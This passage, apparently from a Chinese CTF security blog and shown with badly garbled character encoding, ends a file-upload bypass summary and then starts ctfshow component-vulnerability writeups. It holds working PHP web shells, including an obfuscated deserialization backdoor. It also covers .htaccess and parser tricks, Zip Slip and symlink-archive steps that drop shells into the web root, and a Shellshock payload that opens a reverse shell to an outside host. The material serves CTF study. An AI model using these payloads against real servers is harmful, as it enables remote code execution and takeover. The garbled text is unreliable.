<p>trick1ï¼š<code>auto_append_file</code>ä¹Ÿæ”¯æŒä¼ªåè®®çš„ä½¿ç”¨ï¼Œä¾‹å¦‚<code>auto_append_file = php://input</code><br>trick2ï¼šå¯ä»¥åŒ…å«nginxæ—¥å¿—ï¼Œä¾‹å¦‚<code>auto_append_file = /var/log/nginx/access.log</code>ï¼Œè®¿é—®çš„æ—¶å€™åœ¨uaå¤´å†™ä¸Šä¸€å¥è¯æœ¨é©¬</p>
<h1 id="å†…å®¹æ£€æµ‹"><a href="#å†…å®¹æ£€æµ‹" class="headerlink" title="å†…å®¹æ£€æµ‹"></a>å†…å®¹æ£€æµ‹</h1><p>å¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•æ¥ç¡®å®šè¢«æ£€æµ‹çš„å…³é”®å­—</p>
<p>ç¬¬ä¸€ç§æƒ…å†µï¼šæ£€æµ‹phpçš„å…³é”®æ ‡ç­¾ï¼Œæ¯”å¦‚<code>&lt;?php ?&gt;</code><br>å¯ä»¥å°è¯•ä½¿ç”¨å…¶ä»–æ ‡ç­¾ï¼Œå¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">2333</span>]);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨scriptæ ‡ç­¾å¯¹phpç‰ˆæœ¬æœ‰è¦æ±‚ï¼š<code>php &lt; 7</code></p>
<p>æˆ–è€…ä½¿ç”¨çŸ­æ ‡ç­¾</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure>

<p>å†æˆ–è€…å¯ä»¥ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶æ¥ä¿®æ”¹é…ç½®é¡¹</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .txt<br>php_value auto_append_file <span class="hljs-string">&quot;php://filter/convert.base64-decode/resource=1.txt&quot;</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åä¸Šä¼ base64ç¼–ç çš„txtæ–‡ä»¶å³å¯</p>
<p>ç¬¬äºŒç§æƒ…å†µï¼šæ£€æµ‹å±é™©å‡½æ•°ç­‰æ•æ„Ÿå†…å®¹<br>å¯ä»¥ä½¿ç”¨å…æ€é©¬ç­‰</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>])) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HandShip</span> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$male</span>;<br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$allin</span> = <span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-variable">$allin</span>(<span class="hljs-variable language_">$this</span>-&gt;male);<br>     &#125;<br>  &#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>])==<span class="hljs-string">&#x27;ce61649168c4550c2f7acab92354dc6e&#x27;</span>)&#123;<br><br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;run&#x27;</span>]);<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ–¹æ³•<code>run=O:8:&quot;HandShip&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:4:&quot;male&quot;;s:9:&quot;cat /home&quot;;&#125;;&amp;code=panda</code></p>
<h1 id="apacheè§£ææ¼æ´"><a href="#apacheè§£ææ¼æ´" class="headerlink" title="apacheè§£ææ¼æ´"></a>apacheè§£ææ¼æ´</h1><p>éå¸¸ç®€å•çš„ä¸€ä¸ªæ¼æ´<br>Apacheé»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªä»¥ç‚¹.åˆ†å‰²çš„åç¼€ï¼Œå½“å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«ï¼Œåˆ™ç»§ç»­å‘å·¦è¯†åˆ«<br>ä¸Šä¼ <code>shell.php.asd</code><br>asdè¿™ä¸ªåç¼€æ— æ³•è§£æï¼ŒæœåŠ¡å™¨å°±ä¼šè®¤ä¸ºåç¼€æ˜¯.phpï¼Œä»è€Œç»•è¿‡</p>
<p>è¯¥æ¼æ´ä¸Apache ã€ phpç‰ˆæœ¬è¯¯å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´</p>
<p>é…ç½®å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt;FilesMatch <span class="hljs-string">&quot;.+\.ph(ar|p|tml)&quot;</span>&gt;<br>    SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>

<p>ä¸åœ¨mime.typeså½“ä¸­çš„éƒ½ä¸è®¤è¯†</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Windowsï¼š/apche/conf/mine.types<br>Ubuntuï¼š/etc/mime.types<br></code></pre></td></tr></table></figure>

<h1 id="iis-aspç›®å½•è§£ææ¼æ´"><a href="#iis-aspç›®å½•è§£ææ¼æ´" class="headerlink" title="iis aspç›®å½•è§£ææ¼æ´"></a>iis aspç›®å½•è§£ææ¼æ´</h1><p>è¯¥è§£ææ¼æ´å½¢æˆåŸå› æ˜¯ä»¥*.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œé¢çš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œaspæ–‡ä»¶è§£æï¼</p>
<h1 id="iis-åˆ†å·æ¼æ´"><a href="#iis-åˆ†å·æ¼æ´" class="headerlink" title="iis åˆ†å·æ¼æ´"></a>iis åˆ†å·æ¼æ´</h1><p>*.asp;.jpg åƒè¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨â€œï¼›â€åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ *.aspæ–‡ä»¶æ‰§è¡Œã€‚</p>
<h1 id="nginxé”™è¯¯é…ç½®æ¼æ´"><a href="#nginxé”™è¯¯é…ç½®æ¼æ´" class="headerlink" title="nginxé”™è¯¯é…ç½®æ¼æ´"></a>nginxé”™è¯¯é…ç½®æ¼æ´</h1><p><em>è¯¥æ¼æ´ä¸Nginxã€phpç‰ˆæœ¬æ— å…³ï¼Œå±äºç”¨æˆ·é…ç½®ä¸å½“é€ æˆçš„è§£ææ¼æ´</em></p>
<p>1ï¼šç”±äº<code>nginx.conf</code>çš„é”™è¯¯é…ç½®å¯¼è‡´<code>nginx</code>æŠŠä»¥<code>.php</code>ç»“å°¾çš„æ–‡ä»¶äº¤ç»™<code>fastcgi</code>å¤„ç†ï¼Œä¸ºæ­¤å¯ä»¥æ„é€ <code>upload/1.png/1.php</code>ï¼ˆ1.pngæ˜¯ä¸Šä¼ çš„æ–‡ä»¶ï¼ŒåŒ…å«ä¸€å¥è¯æœ¨é©¬ï¼‰</p>
<p>2ï¼šä½†æ˜¯<code>fastcgi</code>åœ¨å¤„ç†<code>1.php</code>æ–‡ä»¶æ—¶å‘ç°æ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œè¿™æ—¶<code>php.ini</code>é…ç½®æ–‡ä»¶ä¸­<code>cgi.fix_pathinfo=1</code>å‘æŒ¥ä½œç”¨ï¼Œè¿™é¡¹é…ç½®ç”¨äºä¿®å¤è·¯å¾„ï¼Œå¦‚æœå½“å‰è·¯å¾„ä¸å­˜åœ¨åˆ™é‡‡ç”¨ä¸Šå±‚è·¯å¾„ã€‚ä¸ºæ­¤è¿™é‡Œäº¤ç”±<code>fastcgi</code>å¤„ç†çš„æ–‡ä»¶å°±å˜æˆäº†<code>/1.png</code>ï¼Œæœ€åå°†<code>1.png</code>çš„å†…å®¹å½“æˆphpè§£æ</p>
<h1 id="è¶…å¤§æ–‡ä»¶åç»•è¿‡"><a href="#è¶…å¤§æ–‡ä»¶åç»•è¿‡" class="headerlink" title="è¶…å¤§æ–‡ä»¶åç»•è¿‡"></a>è¶…å¤§æ–‡ä»¶åç»•è¿‡</h1><p>Content-Disposition: form-data; name&#x3D;â€fileâ€; filename&#x3D;â€1.a.a.a.ä¸è¦å¿½ç•¥æˆ‘çš„é•¿åº¦.a.jsp</p>
<h1 id="DATAç»•è¿‡"><a href="#DATAç»•è¿‡" class="headerlink" title="DATAç»•è¿‡"></a>DATAç»•è¿‡</h1><p>æ²¡æœ‰å¯¹åç¼€åä¸­çš„<code>::$DATA</code>è¿›è¡Œè¿‡æ»¤ã€‚åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+<code>::$DATA</code>ä¼šæŠŠ<code>::$DATA</code>ä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ<code>::$DATA</code>ä¹‹å‰çš„æ–‡ä»¶åã€‚åˆ©ç”¨windowsç‰¹æ€§ï¼Œå¯åœ¨åç¼€åä¸­åŠ <code>::$DATA</code>ç»•è¿‡</p>
<h1 id="å¸¸è§åç¼€"><a href="#å¸¸è§åç¼€" class="headerlink" title="å¸¸è§åç¼€"></a>å¸¸è§åç¼€</h1><figure class="highlight clojure"><table><tr><td class="code"><pre><code class="hljs clojure">(<span class="hljs-string">&quot;.php&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.phtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pht&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ascx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ashx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aScx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aShx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cEr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.sWf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.swf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htaccess&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ini&quot;</span>)<br></code></pre></td></tr></table></figure>

<h1 id="getimagesizeå‡½æ•°ç»•è¿‡"><a href="#getimagesizeå‡½æ•°ç»•è¿‡" class="headerlink" title="getimagesizeå‡½æ•°ç»•è¿‡"></a>getimagesizeå‡½æ•°ç»•è¿‡</h1><p>å½“åœ¨ä»£ç ä¸­ä½¿ç”¨<code>getimagesize</code>å‡½æ•°æ¥æ£€æµ‹æ˜¯ä¸æ˜¯å›¾ç‰‡ï¼Œè€Œä¸é‡‡å–å…¶ä»–æªæ–½çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨æ–‡ä»¶å¤´åŠ ä¸Šå¦‚ä¸‹å†…å®¹(XBMæ ¼å¼å›¾ç‰‡)æ¥ç»•è¿‡æ£€æµ‹</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">#define width 100;<br>#define height 100;<br></code></pre></td></tr></table></figure>

<h1 id="Zip-Slip"><a href="#Zip-Slip" class="headerlink" title="Zip Slip"></a>Zip Slip</h1><p>ä¸Šä¼ zipç±»å‹çš„æ–‡ä»¶åï¼Œåº”ç”¨ç¨‹åºè‡ªåŠ¨è¿›è¡Œè§£å‹ï¼Œå°±æœ‰å¯èƒ½å­˜åœ¨<code>zip slip</code>æ¼æ´</p>
<p>ä½¿ç”¨pythonç”Ÿæˆæˆ–è€…010ç­‰å·¥å…·æ‰‹åŠ¨ç¼–è¾‘è·¯å¾„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-comment"># the name of the zip file to generate</span><br>zf = zipfile.ZipFile(<span class="hljs-string">&#x27;out.zip&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-comment"># the name of the malicious file that will overwrite the origial file (must exist on disk)</span><br>fname = <span class="hljs-string">&#x27;sec_test.txt&#x27;</span><br><span class="hljs-comment">#destination path of the file</span><br>zf.write(fname, <span class="hljs-string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../tmp/sec_test.tmp&#x27;</span>)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>unzipå‘½ä»¤æ˜¯æ— æ³•å®ç°ç›®å½•ç©¿è¶Šçš„ï¼Œä¼šé»˜è®¤è·³è¿‡..&#x2F;</p>
</blockquote>
<p><a href="https://github.com/snyk/zip-slip-vulnerability">æ‰€æœ‰å·²å‘ç°å—Zip Slipå½±å“çš„é¡¹ç›®</a></p>
<h1 id="zipè½¯è¿æ¥"><a href="#zipè½¯è¿æ¥" class="headerlink" title="zipè½¯è¿æ¥"></a>zipè½¯è¿æ¥</h1><p>å½“è§£å‹æ“ä½œå¯ä»¥è¦†ç›–ä¸Šä¸€æ¬¡è§£å‹æ–‡ä»¶æ—¶è§¦å‘</p>
<p>ä¾‹å¦‚ciscn2023-unzip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;;<br><br><span class="hljs-comment">//only this!</span><br></code></pre></td></tr></table></figure>


<p><code>unzip</code>çš„<code>-o</code>å‚æ•°è¡¨ç¤º ä¸å¿…å…ˆè¯¢é—®ç”¨æˆ·ï¼Œunzipæ‰§è¡Œåè¦†ç›–åŸæœ‰çš„æ–‡ä»¶</p>
<p><strong>æ„é€ ç¬¬ä¸€ä¸ªå‹ç¼©åŒ…</strong></p>
<p>å…ˆæ„é€ ä¸€ä¸ªæŒ‡å‘<code>/var/www/html</code>çš„è½¯è¿æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /var/www/html poc<br></code></pre></td></tr></table></figure>

<p>å†ä¿ç•™è½¯è¿æ¥å‹ç¼©</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">zip --symlinks test.zip poc<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶ä¸Šä¼ è¯¥<code>test.zip</code>è§£å‹å‡ºé‡Œè¾¹çš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è½¯è¿æ¥åˆ°<code>/var/www/html</code></p>
<p><strong>æ„é€ ç¬¬äºŒä¸ªå‹ç¼©åŒ…</strong></p>
<p>å…ˆåˆ›å»ºè·Ÿç¬¬ä¸€ä¸ªå‹ç¼©åŒ…ä¸­ç›®å½•åŒåçš„ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> poc<br></code></pre></td></tr></table></figure>

<p>æ¥ç€å‘ç›®å½•ä¸­å†™ä¸€ä¸ªshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;</span> &gt; ./poc/shell.php<br></code></pre></td></tr></table></figure>

<p>å‹ç¼©è¿™ä¸ªç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">zip -r test1.zip poc<br></code></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬ä¸Šä¼ ç¬¬äºŒä¸ªå‹ç¼©åŒ…æ—¶ï¼Œå› ä¸º<code>poc</code>ç›®å½•å·²ç»è½¯è¿æ¥åˆ°<code>/var/www/html</code>äº†ï¼Œæ‰€ä»¥è§£å‹çš„æ—¶å€™ä¼šæŠŠ<code>shell.php</code>æ”¾åœ¨<code>/var/www/html</code></p>
<p><img src="/img/summary/file_upload-18.png"></p>
<h1 id="tarè§£å‹ç›®å½•ç©¿è¶Š"><a href="#tarè§£å‹ç›®å½•ç©¿è¶Š" class="headerlink" title="tarè§£å‹ç›®å½•ç©¿è¶Š"></a>tarè§£å‹ç›®å½•ç©¿è¶Š</h1><p>tarå‘½ä»¤å¯ä»¥åœ¨æ‰“åŒ…çš„æ—¶å€™æŠŠè·¯å¾„ä¹Ÿæ‰“åŒ…è¿›å»</p>
<p><code>tar cPvf test.tar ../../../../../var/www/html/upload/payload.php</code></p>
<blockquote>
<p>Linuxä¸‹è§£å‹(ä½¿ç”¨çš„æ˜¯GNUçš„tar)ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œtarä¼šè‡ªåŠ¨æŠŠå‰é¢çš„&#x2F;å»æ‰ï¼Œç„¶ååœ¨å½“å‰ç›®å½•è§£å‹<br>Unixåˆ™ä¸ç„¶ï¼Œä¼šä¾ç…§ç»å¯¹è·¯å¾„è§£å‹ï¼Œå¯¹è·¯å¾„ä¸­çš„å…¶ä»–æ–‡ä»¶ä¸å½±å“ï¼Œå¯¹ç›¸åŒçš„æ–‡ä»¶ï¼Œè¦†ç›–ã€‚å¦‚æœä¸å­˜åœ¨æŸä¸ªç›®å½•ï¼Œåˆ™åˆ›å»º(å¦‚æœæœ‰æƒé™)ã€‚<br>åœ¨è¿™é‡Œ pythonçš„è§£å‹ ä¸Unixçš„è§£å‹åŒç†ï¼Œä¼šç›´æ¥åœ¨æŒ‡å®šè·¯å¾„ä¸‹è¿›è¡Œè§£å‹</p>
</blockquote>
<h1 id="phar-x2F-x2F-amp-zip-x2F-x2F"><a href="#phar-x2F-x2F-amp-zip-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F; &amp; zip:&#x2F;&#x2F;</h1><p><code>http://localhost/?url=phar://uploads/63e93ffe53f03e93bb0a0249152d243874e31c9b.zip/shell</code><br><code>http://localhost/?url=zip:///var/www/html/upload/892e38cea0c47c744ecc60ccacc94c23.zip%23shell</code></p>
<h1 id="åˆ©ç”¨ä¸­é—´ä»¶å·®å¼‚ç»•è¿‡waf"><a href="#åˆ©ç”¨ä¸­é—´ä»¶å·®å¼‚ç»•è¿‡waf" class="headerlink" title="åˆ©ç”¨ä¸­é—´ä»¶å·®å¼‚ç»•è¿‡waf"></a>åˆ©ç”¨ä¸­é—´ä»¶å·®å¼‚ç»•è¿‡waf</h1><p>æ¥è‡ªè¥¿æ¹–è®ºå‰‘çš„ä¸€é“é¢˜ç›®ï¼šæ‰­è½¬ä¹¾å¤</p>
<p>ä¸Šä¼ å‘ç°æç¤ºçš„<code>apache</code>ä¸æ”¯æŒ<code>Content-Type: multipart/form-data</code></p>
<p>åç«¯ä¸º<code>tomcat</code>ï¼Œ<code>tomcat</code>å¯¹äºåŒ…è§£æå¹¶ä¸æ˜¯ä¸¥æ ¼æŒ‰ç…§<code>RFC</code>ä¸­çš„æ ‡å‡†ï¼Œå¯¹ä¸€äº›å¼‚å¸¸çš„<code>header</code>å¤´å†…å®¹ä¹Ÿä¼šå…¼å®¹</p>
<p>åŒ…æ‹¬ä½†ä¸é™äºï¼Œä¿®æ”¹ä¸º<code>Content-Type</code>ä¸º<code>multipart//form-data;</code>ï½œ<code>å¤§å°å†™å…¼å®¹</code>ï½œ<code>multipart</code>ï½œ<code>multipart/  form-data;</code></p>
<h1 id="åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹"><a href="#åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹" class="headerlink" title="åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹"></a>åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹</h1><p>å€Ÿç”¨<a href="https://gv7.me/">c0ny1</a>å¸ˆå‚…çš„ä¸€ä¸ªå›¾<br><img src="/img/summary/file_upload-up.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ–‡ä»¶ä¸Šä¼ çš„åŸºæœ¬å§¿åŠ¿åº”è¯¥éƒ½æåŠäº†<br>æ¬¢è¿è¡¥å……å’ŒæŒ‡æ­£ï¼</p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘webå…¥é—¨-ç»„ä»¶æ¼æ´</title>
    <url>/posts/605e5ac9/</url>
    <content><![CDATA[<blockquote>
<p>WEB580â€“WEB599</p>
</blockquote>
<p><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E.png"></p>
<h1 id="WEB580"><a href="#WEB580" class="headerlink" title="WEB580"></a>WEB580</h1><p>æ ¹æ®é¢˜ç›®æ‰€ç»™çš„æç¤ºâ€œç ´å£³â€ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯Shellshock ç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰<br>è¿™ä¸€é¢˜è¯•äº†å¾ˆå¤šç§payloadï¼Œé™¤äº†èƒ½çœ‹&#x2F;etc&#x2F;passwdï¼Œå…¶ä»–éƒ½æ²¡æœ‰å›æ˜¾æˆ–è¿”å›500ï¼Œæ— å¥ˆåªèƒ½åå¼¹shellï¼ˆè¿˜æ˜¯å¤ªèœäº†ï¼‰<br>payloadï¼š<br><code>() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;</code><br>å‘é€å¦‚ä¸‹æ•°æ®åŒ…</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /cgi-bin/index.cgi HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">7</span>f35523e-<span class="hljs-number">4939</span>-<span class="hljs-number">43</span>d8-<span class="hljs-number">8</span>a05-f6348618a843.challenge.ctf.show:<span class="hljs-number">8080</span><br><span class="hljs-attribute">Pragma</span>: no-cache<br><span class="hljs-attribute">Cache</span>-Control: no-cache<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">lewiserii</span>: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/<span class="hljs-number">37634</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>;<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">91</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4472</span>.<span class="hljs-number">106</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">7</span>f35523e-<span class="hljs-number">4939</span>-<span class="hljs-number">43</span>d8-<span class="hljs-number">8</span>a05-f6348618a843.challenge.ctf.show:<span class="hljs-number">8080</span>/cgi-bin/victim.cgi<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">179</span>eb628608d03-<span class="hljs-number">066</span>c8283766a21-f7f1939-<span class="hljs-number">1</span>bcab9-<span class="hljs-number">179</span>eb62860986d<br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure>
<p>æ‹¿åˆ°shell<br><img src="/img/ctfshow/web%E5%85%A5%E9%97%A8/web580-1.png"></p>
<h1 id="WEB581"><a href="#WEB581" class="headerlink" title="WEB581"></a>WEB581</h1><p>å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://paper.seebug.org/334/">CVE-2017-6920</a><br>payloadï¼š</p>
